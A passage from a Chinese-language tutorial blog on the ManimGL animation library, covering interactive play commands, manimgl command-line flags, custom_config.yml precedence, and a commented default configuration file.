-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [1]: play(circle.animate.stretch(4, dim=0))</span><br><span class="line"></span><br><span class="line">In [2]: play(circle.animate.stretch(4, dim=0))</span><br><span class="line"></span><br><span class="line">In [3]:</span><br></pre></td></tr></table></figure>
-
-<p>In [n]:之后输入命令就可以了</p>
-<p>此时所有的函数都是对作用于selft的,play就相当于self.play,当然写着self.也不会错</p>
-<p>在iPython终端上调用<code>play(ReplacementTransform(circle, square))</code>,就实现了从矩形再变灰圆圈</p>
-<h2 id="manim命令行"><a href="#manim命令行" class="headerlink" title="manim命令行"></a>manim命令行</h2><p>环境变量Path里有一个<code>python&lt;版本号&gt;\Scripts\</code>目录</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220906175408295.png" alt="image-20220906175408295"></p>
-<p>这下面不知道什么时候就有了</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220906175442199.png" alt="image-20220906175442199"></p>
-<p>也就是说不从manim 根目录下面也可以使用该命令</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">manimgl &lt;code&gt;.py &lt;Scene&gt; &lt;flags&gt;</span><br><span class="line">manim<span class="literal">-render</span> &lt;code&gt;.py &lt;Scene&gt; &lt;flags&gt;</span><br></pre></td></tr></table></figure>
-
-<p>其中</p>
-<p><code>&lt;code&gt;.py</code>是源文件</p>
-<p><code>&lt;scene&gt;</code>是要渲染的场景类,如果不写并且<code>&lt;code&gt;.py</code>中只有一个类,则渲染这个类,否则需要列出所有类</p>
-<p><code>&lt;flags&gt;</code>选项</p>
-<h3 id="flags选项"><a href="#flags选项" class="headerlink" title="flags选项"></a>flags选项</h3><p>常用的有</p>
-<ul>
-<li><code>-w</code> 把场景写入文件</li>
-<li><code>-o</code> 把场景写入文件并打开</li>
-<li><code>-s</code> 跳到最后只展示最后一帧</li>
-<li><code>-so</code> 保存最后一帧并打开</li>
-<li><code>-n &lt;number&gt;</code> 跳到场景中第 <code>n</code> 个动画</li>
-<li><code>-f</code> 打开窗口全屏</li>
-</ul>
-<h4 id="w-o"><a href="#w-o" class="headerlink" title="-w,-o"></a><code>-w,-o</code></h4><p>比如<code>manimgl start.py -w</code>之后默认会在当前工作目录下面生成一个video文件夹,</p>
-<p>里面有一个<code>SquareToCircle.mp4</code>文件,显然是按照场景类名命令的文件名</p>
-<p>可以使用<code>--video_dir VIDEO_DIR</code>修改该导出目录</p>
-<p><code>-o</code>选项的作用类似于<code>-w</code>,只不过导出文件后又打开了</p>
-<h4 id="n-number"><a href="#n-number" class="headerlink" title="-n number"></a><code>-n number</code></h4><p><code>-n &lt;number&gt;</code>跳转到场景中的第n个动画,啥意思呢?</p>
-<p>每一个self.play都是一个动画</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">self</span>.play(ShowCreation(square)) <span class="comment">#第一个动画</span></span><br><span class="line"><span class="variable language_">self</span>.play(ReplacementTransform(square, circle)) <span class="comment">#第二个动画</span></span><br></pre></td></tr></table></figure>
-
-<p>-n number1,bumber2…只渲染指定的动画</p>
-<h4 id="c"><a href="#c" class="headerlink" title="-c &lt;color&gt;"></a><code>-c &lt;color&gt;</code></h4><p>设置背景颜色,比如WHITE就是白色</p>
-<h4 id="更多参数"><a href="#更多参数" class="headerlink" title="更多参数"></a>更多参数</h4><p>详见<a target="_blank" rel="noopener" href="https://docs.manim.org.cn/getting_started/configuration.html">命令行参数和配置 - ManimGL 文档</a></p>
-<h2 id="个性化设置"><a href="#个性化设置" class="headerlink" title="个性化设置"></a>个性化设置</h2><p>在manim的各级子目录下面都可以建立custom_config.yml文件</p>
-<p>子目录终端custom_config.yml会覆盖父目录中custom_config.yml的设置</p>
-<p>只要有custom_config.yml,就会覆盖manim&#x2F;manimlib&#x2F;default_config.yml中的设置</p>
-<p>命令行上的设置又会覆盖所有yml中的设置</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">manim/</span><br><span class="line">├── manimlib/</span><br><span class="line">│   ├── animation/</span><br><span class="line">│   ├── ...</span><br><span class="line">│   ├── default_config.yml</span><br><span class="line">│   └── window.py</span><br><span class="line">├── project/</span><br><span class="line">│   ├── code.py</span><br><span class="line">│   └── custom_config.yml</span><br><span class="line">└── custom_config.yml</span><br></pre></td></tr></table></figure>
-
-<p>也可以在命令行上手工指定配置文件的位置</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">manimgl project/code.py <span class="literal">--config_file</span> /path/to/custom_config.yml</span><br></pre></td></tr></table></figure>
-
-<p>这个配置文档应该怎么写呢?</p>
-<p>manim&#x2F;manimlib&#x2F;default_config.yml给出了样本</p>
-<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">directories:</span></span><br><span class="line">  <span class="attr">mirror_module_path:</span> <span class="literal">False</span> <span class="comment">#是否在output指定的目录下建立项目并输出文件</span></span><br><span class="line">  <span class="attr">output:</span> <span class="string">&quot;&quot;</span>	<span class="comment">#输出目录需要mirror_module_path: True有效</span></span><br><span class="line">  <span class="attr">raster_images:</span> <span class="string">&quot;&quot;</span>	<span class="comment">#像素图像源</span></span><br><span class="line">  <span class="attr">vector_images:</span> <span class="string">&quot;&quot;</span>	<span class="comment">#矢量图源</span></span><br><span class="line">  <span class="attr">sounds:</span> <span class="string">&quot;&quot;</span>	<span class="comment">#声音文件源</span></span><br><span class="line">  <span class="attr">temporary_storage:</span> <span class="string">&quot;&quot;</span>	<span class="comment">#临时存储占用的目录</span></span><br><span class="line"><span class="attr">tex:</span></span><br><span class="line">  <span class="attr">executable:</span> <span class="string">&quot;latex&quot;</span>	<span class="comment">#编译latex使用的可执行程序</span></span><br><span class="line">  <span class="attr">template_file:</span> <span class="string">&quot;tex_template.tex&quot;</span>  <span class="comment">#使用的latex模板,模板,模板</span></span><br><span class="line">  <span class="attr">intermediate_filetype:</span> <span class="string">&quot;dvi&quot;</span>	<span class="comment">#编译后产生的中间矢量文档类型,latex-&gt;dvi;xelatex-&gt;xdv</span></span><br><span class="line">  <span class="attr">text_to_replace:</span> <span class="string">&quot;[tex_expression]&quot;</span>	</span><br><span class="line"><span class="attr">universal_import_line:</span> <span class="string">&quot;from manimlib import *&quot;</span>	<span class="comment">#直接进入交互模式时需要导入的包</span></span><br><span class="line"><span class="attr">style:</span></span><br><span class="line">  <span class="attr">font:</span> <span class="string">&quot;Consolas&quot;</span>	<span class="comment">#默认字体类型</span></span><br><span class="line">  <span class="attr">text_alignment:</span> <span class="string">&quot;LEFT&quot;</span>	<span class="comment">#字体对齐模式</span></span><br><span class="line">  <span class="attr">background_color:</span> <span class="string">&quot;#333333&quot;</span>	<span class="comment">#默认背景颜色,灰色</span></span><br><span class="line"><span class="attr">window_position:</span> <span class="string">UR</span> <span class="comment">#窗口在显示器中的位置,默认是Uppder,Right,右上角,U/O/D,L/O/R	</span></span><br><span class="line"><span class="attr">window_monitor:</span> <span class="number">0</span>	<span class="comment">#在哪个显示器出现,默认是0号</span></span><br><span class="line"><span class="attr">full_screen:</span> <span class="literal">False</span>	<span class="comment">#是否全屏展示,默认不全屏</span></span><br><span class="line"><span class="attr">break_into_partial_movies:</span> <span class="literal">False</span>	<span class="comment">#是否将每个self.play和self.wait单独分成一个视频</span></span><br><span class="line"><span class="attr">camera_resolutions:</span>		<span class="comment">#导出分辨率</span></span><br><span class="line">  <span class="attr">low:</span> <span class="string">&quot;854x480&quot;</span>	<span class="comment">#低级分辨率低</span></span><br><span class="line">  <span class="attr">med:</span> <span class="string">&quot;1280x720&quot;</span></span><br><span class="line">  <span class="attr">high:</span> <span class="string">&quot;1920x1080&quot;</span></span><br><span class="line">  <span class="attr">4k:</span> <span class="string">&quot;3840x2160&quot;</span></span><br><span class="line">  <span class="attr">default_resolution:</span> <span class="string">&quot;high&quot;</span> <span class="comment">#默认是high等级的,已经够用了</span></span><br><span class="line"><span class="attr">fps:</span> <span class="number">30</span>	<span class="comment">#帧率</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="Manim项目结构"><a href="#Manim项目结构" class="headerlink" title="Manim项目结构"></a>Manim项目结构</h2><p>来自<a target="_blank" rel="noopener" href="https://docs.manim.org.cn/getting_started/structure.html">Manim 结构 - ManimGL 文档</a></p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/carbon.svg" alt="Manim structure"></p>
-<h2 id="Manim完整控制流"><a href="#Manim完整控制流" class="headerlink" title="Manim完整控制流"></a>Manim完整控制流</h2><p><img src="https://fastly.jsdelivr.net/gh/manim-kindergarten/CDN@master/manimgl_assets/manim_shaders_process_cn.png" alt="https://fastly.jsdelivr.net/gh/manim-kindergarten/CDN@master/manimgl_assets/manim_shaders_process_cn.png"></p>
 
       
     </div>
